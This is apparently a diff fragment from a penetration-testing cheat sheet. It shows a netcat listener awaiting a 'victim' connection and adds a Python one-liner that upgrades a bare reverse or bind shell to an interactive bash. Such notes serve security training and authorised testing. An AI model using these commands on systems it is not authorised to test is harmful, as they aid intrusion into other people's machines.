@@ -434,3 +434,19 @@ $ nc -nlp 443
 We should receive the connection from the victim.
 
 
+Python shell
+------------
+
+If you have a bind shell or reverse shell where you don't get the actual shell just execution:
+python -c 'import pty;pty.spawn("/bin/bash")'
+$export TERM=linux
+
+
+
+
+
+
+
+
+
+
